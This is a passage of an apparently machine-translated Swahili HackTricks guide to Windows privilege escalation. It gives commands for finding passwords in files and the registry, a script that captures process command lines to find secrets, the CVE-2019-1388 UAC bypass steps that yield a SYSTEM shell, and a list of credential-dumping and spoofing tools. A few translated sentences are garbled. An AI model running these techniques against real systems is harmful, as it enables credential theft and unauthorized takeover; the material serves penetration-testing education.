![](<../../.gitbook/assets/image (729).png>)

Kimsingi, ikiwa unaweza **kuandika upya mojawapo ya DLLs** ambazo zitakazotekelezwa, unaweza **kupandisha vyeo** ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.

Ili kujifunza jinsi wadukuzi wanavyotumia Uandishi wa COM kama mbinu ya uthabiti angalia:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Utafutaji wa Jumla wa Nywila kwenye faili na usajili**

**Tafuta maudhui ya faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili yenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta usajili kwa majina ya funguo na nywila**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana zinazotafuta nywila

[Zana ya **MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni programu-jalizi ya msf** niliyoitengeneza ili **kutekeleza moja kwa moja kila moduli ya metasploit POST inayotafuta nywila** ndani ya mhanga.\
[Zana ya **Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta moja kwa moja faili zote zinazoonyesha nywila zilizotajwa kwenye ukurasa huu.\
[Zana ya **Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kuchimbua nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **vikao**, **majina ya watumiaji** na **nywila** za zana kadhaa ambazo hifadhi data hii kwa maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Mabano Yaliyovuja

Fikiria kwamba **mchakato unaoendeshwa kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) **ukiwa na upatikanaji kamili**. Mchakato huo huo **pia unajenga mchakato mpya** (`CreateProcess()`) **ukiwa na mamlaka madogo lakini ukiurithi mabano yote yaliyofunguliwa ya mchakato mkuu**.\
Kisha, ukikua na **upatikanaji kamili wa mchakato uliopewa mamlaka madogo**, unaweza kunasa **mabano yaliyofunguliwa ya mchakato uliopewa mamlaka** uliozinduliwa kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho lingine hapa kwa maelezo kamili zaidi kuhusu jinsi ya kujaribu na kutumia mabano zaidi ya mchakato na nyuzi zilizorithiwa na viwango tofauti vya ruhusa (siyo upatikanaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Uigaji wa Mteja wa Mabomba Yaliyopewa Majina

Vipande vya kumbukumbu vilivyoshirikiwa, vinavyojulikana kama **mabomba**, huruhusu mawasiliano ya mchakato na uhamishaji wa data.

Windows hutoa kipengele kinachoitwa **Mabomba Yaliyopewa Majina**, kuruhusu michakato isiyohusiana kushiriki data, hata juu ya mitandao tofauti. Hii inafanana na muundo wa mteja/mhudumu, na majukumu yakiwekwa kama **mhudumu wa mabomba aliyepewa jina** na **mteja wa mabomba aliyepewa jina**.

Wakati data inapotumwa kupitia bomba na **mteja**, **mhudumu** aliyeunda bomba ana uwezo wa **kuchukua utambulisho** wa **mteja**, ikizingatiwa kuwa una **haki za SeImpersonate** zinazohitajika. Kutambua **mchakato uliopewa mamlaka** unaozungumza kupitia bomba unaweza kufanana naye hutoa fursa ya **kupata mamlaka ya juu** kwa kuchukua utambulisho wa mchakato huo mara unaposhirikiana na bomba uliloanzisha. Kwa maelekezo ya kutekeleza shambulio kama hilo, mwongozo mzuri unaweza kupatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](./#from-high-integrity-to-system).

Pia zana ifuatayo inaruhusu **kukamata mawasiliano ya bomba lililopewa jina kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona mabomba yote kwa kutafuta privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Mambo Mengine

### **Kufuatilia Mistari ya Amri kwa ajili ya nywila**

Ukipata kabati kama mtumiaji, kunaweza kuwa na kazi zilizopangwa au michakato mingine inayotekelezwa ambayo **inapitisha siri kwenye mstari wa amri**. Skripti hapa chini inakamata mistari ya amri ya michakato kila baada ya sekunde mbili na kulinganisha hali ya sasa na ile ya awali, ikitoa tofauti zozote.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kuiba nywila kutoka kwa michakato

## Kutoka kwa Mtumiaji wa Low Priv hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / Kupuuza UAC

Ikiwa una ufikiaji wa kiolesura cha picha (kupitia konsoli au RDP) na UAC imewezeshwa, katika baadhi ya toleo za Microsoft Windows inawezekana kuzindua terminal au michakato mingine kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na mamlaka.

Hii inawezesha kuinua mamlaka na kupuuza UAC wakati huo huo kwa kutumia kasoro hiyo hiyo. Aidha, hakuna haja ya kusakinisha kitu chochote na faili inayotumiwa wakati wa mchakato huo, imehakikishwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni kama ifuatavyo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Kutumia udhaifu huu, ni lazima ufanye hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Unayo faili zote muhimu na habari katika hifadhi ya GitHub ifuatayo:

https://github.com/jas502n/CVE-2019-1388

## Kutoka kwa Msimamizi wa Kati hadi Msimamizi wa Juu wa Uadilifu / Kizuizi cha UAC

Soma hii **kujifunza kuhusu Viwango vya Uadilifu**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Kisha **soma hii kujifunza kuhusu UAC na njia za kukiuka UAC:**

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **Kutoka kwa Uadilifu wa Juu hadi Mfumo**

### **Huduma Mpya**

Ikiwa tayari unatekelezwa kwenye mchakato wa Uadilifu wa Juu, **njia ya kufikia SYSTEM** inaweza kuwa rahisi tu **kwa kuunda na kutekeleza huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Kutoka kwa mchakato wa High Integrity unaweza **jaribu kuwezesha kuingiza kila wakati kwa kuingiza kila wakati kwa kutumia kuingiza kila wakati** na **kufunga** kifuniko cha _**.msi**_.\
[Maelezo zaidi kuhusu funguo za usajili zinazohusika na jinsi ya kufunga pakiti ya _.msi_ hapa.](./#alwaysinstallelevated)

### High + SeImpersonate uwezo wa System

**Unaweza** [**pata msimbo hapa**](seimpersonate-from-high-to-system.md)**.**

### Kutoka SeDebug + SeImpersonate hadi mamlaka kamili ya Token

Ikiwa una mamlaka hizo za token (labda utapata hii katika mchakato wa High Integrity tayari), utaweza **kufungua karibu mchakato wowote** (siyo mchakato uliolindwa) na mamlaka ya SeDebug, **nakili token** ya mchakato, na kuunda **mchakato wa kupindukia na token hilo**.\
Kutumia mbinu hii kawaida **huchagua mchakato wowote unaofanya kazi kama SYSTEM na mamlaka yote ya token** (_ndiyo, unaweza kupata michakato ya SYSTEM bila mamlaka yote ya token_).\
**Unaweza kupata** [**mfano wa msimbo unaoendesha mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Pipes Zilizopewa Majina**

Mbinu hii hutumiwa na meterpreter kwa kuzidisha katika `getsystem`. Mbinu hii inajumuisha **kuunda bomba kisha kuunda/kutumia huduma ya kuandika kwenye bomba hilo**. Kisha, **server** ambayo iliunda bomba kwa kutumia mamlaka ya **`SeImpersonate`** itaweza **kuiga token** ya mteja wa bomba (huduma) kupata mamlaka ya SYSTEM.\
Ikiwa unataka [**kujifunza zaidi kuhusu mabomba yaliyopewa majina unapaswa kusoma hii**](./#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**jinsi ya kwenda kutoka kwa uadilifu wa juu hadi System kwa kutumia mabomba yaliyopewa majina unapaswa kusoma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa unafanikiwa **kuteka dll** inayotumiwa na **mchakato** unaofanya kazi kama **SYSTEM** utaweza kutekeleza msimbo wa kupindukia na mamlaka hayo. Kwa hivyo Dll Hijacking ni muhimu pia kwa aina hii ya kuzidisha mamlaka, na, zaidi ya hayo, ikiwa ni rahisi zaidi kufikia kutoka kwa mchakato wa High Integrity kwani itakuwa na **ruhusa ya kuandika** kwenye folda zinazotumiwa kusoma dlls.\
**Unaweza** [**jifunze zaidi kuhusu Dll hijacking hapa**](dll-hijacking/)**.**

### **Kutoka kwa Msimamizi au Huduma ya Mtandao hadi System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Kutoka kwa HUDUMA YA LOKALI au HUDUMA YA MTANDAO hadi mamlaka kamili

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Imepakia binaries za impacket za tuli](https://github.com/ropnop/impacket\_static\_binaries)

## Vifaa vya kufaa

**Zana bora ya kutafuta vectors vya kuzidisha mamlaka za ndani za Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia kwa misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia kwa baadhi ya misconfigurations inayowezekana na kukusanya habari (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia kwa misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Inachota habari za kikao kilichohifadhiwa cha PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Inachota siri kutoka kwa Meneja wa Vitambulisho. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Panya nywila zilizokusanywa kote kwenye kikoa**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uchunguzi wa msingi wa Windows wa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Tafuta vulnerabilities za privesc zinazojulikana (IMEACHWA NYUMA kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Uchunguzi wa ndani **(Inahitaji Haki za Msimamizi)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta vulnerabilities za privesc zinazojulikana (inahitaji kuchakatwa kwa kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Piga orodha ya mwenyeji kutafuta misconfigurations (zaidi ya zana ya kukusanya habari kuliko privesc) (inahitaji kuchakatwa) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Inachota siri kutoka kwa programu nyingi (exe iliyopakuliwa mapema kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Bandari ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Angalia kwa misconfigurations (executable iliyopakuliwa mapema kwenye github). Haipendekezwi. Haiwezi kufanya kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia kwa misconfigurations inayowezekana (exe kutoka python). Haipendekezwi. Haiwezi kufanya kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoanzishwa kulingana na chapisho hili (haitaji accesschk kufanya kazi vizuri lakini inaweza kutumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Inasoma matokeo ya **systeminfo** na kupendekeza mbinu za kazi (python ya ndani)\
[**Windows Exploit Suggester Kizazi Kijacho**](https://github.com/bitsadmin/wesng) -- Inasoma matokeo ya **systeminfo** na kupendekeza mbinu za kazi (python ya ndani)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Unapaswa kuchakata mradi kwa kutumia toleo sahihi la .NET ([ona hii](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo lililowekwa la .NET kwenye mwenyeji wa mwathiriwa unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa kwenye HackTricks**? au ungependa kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
